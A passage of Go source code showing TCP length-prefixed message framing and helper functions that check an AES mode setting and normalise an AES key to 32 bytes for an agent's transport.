		defer client.TCPWriteMu.Unlock()

		// Use framing for TCP
		header := make([]byte, 4)
		binary.BigEndian.PutUint32(header, uint32(len(payload)))
		if _, err := client.TCPConn.Write(header); err != nil {
			return err
		}
		if _, err := client.TCPConn.Write(payload); err != nil {
			return err
		}
		return nil
	}

	return fmt.Errorf("unknown transport: %s", client.Transport)
}

func isAESEnabled(mode string) bool {
	switch strings.ToUpper(strings.TrimSpace(mode)) {
	case "AES-256-GCM", "AES-GCM", "AES":
		return true
	default:
		return false
	}
}

func resolveAESKey(key string) []byte {
	key = strings.TrimSpace(key)
	if key == "" {
		key = store.GetSetting("system_aes_key")
	}
	return normalizeAESKey(key)
}

// normalizeAESKey matches agent get_aes_key_base():
//   - empty → nil (no Noise / no static AES)
//   - 64 hex chars → 32 raw bytes
//   - len < 32 → nil (agent rejects short base keys; do not zero-pad)
//   - len > 32 → truncate to 32
//   - len == 32 → as-is
func normalizeAESKey(key string) []byte {
	key = strings.TrimSpace(key)
	if key == "" {
		return nil
	}
	if len(key) == 64 && isHexString(key) {
		if decoded, err := hex.DecodeString(key); err == nil && len(decoded) == 32 {
			return decoded
		}
	}
	b := []byte(key)
	if len(b) < 32 {
		return nil
	}
	if len(b) > 32 {
		return append([]byte(nil), b[:32]...)
	}
	return append([]byte(nil), b...)
}

